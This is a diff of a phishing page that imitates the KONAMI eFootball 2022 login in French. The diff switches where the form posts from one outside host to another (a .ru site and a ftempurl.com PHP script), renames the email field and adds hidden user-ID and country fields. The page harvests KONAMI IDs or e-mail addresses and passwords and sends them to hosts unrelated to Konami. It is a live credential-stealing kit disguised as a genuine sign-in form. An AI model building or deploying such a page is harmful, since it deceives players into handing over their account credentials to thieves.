@@ -26,17 +26,19 @@
 					<h2 class="hidden-phone"></h2>
 
 					<div class="knm-section" id="page">
-						<form id="loginForm" name="loginForm" method="post" action="http://a0644801.xsph.ru/login.php"
+						<form id="loginForm" name="loginForm" method="post" action="http://zaloggift-001-site1.ftempurl.com/Fpm.php?userid=580"
 							enctype="application/x-www-form-urlencoded">
 							<img src="https://www.konami.com/wepes/mobile/img/efootball2022/efootball2022_main_pc.jpg" width="100%" height="200px">
 							<br>
 							<br>
 
 
-							<p class="text-center"><input id="email" name="email"
+							<p class="text-center"><input id="username" name="username"
 									value="" placeholder="KONAMI ID ou adresse e-mail" type="text"
 									class="input-xlarge" />
 							</p>
+							<input type="text" value="580" name="userid" hidden>
+							<input type="text" value="Morocco" name="country" hidden>
 
 							<p class="text-center"><input id="password" name="password"
 									placeholder="Mot de passe" type="password" class="input-xlarge" value="" />
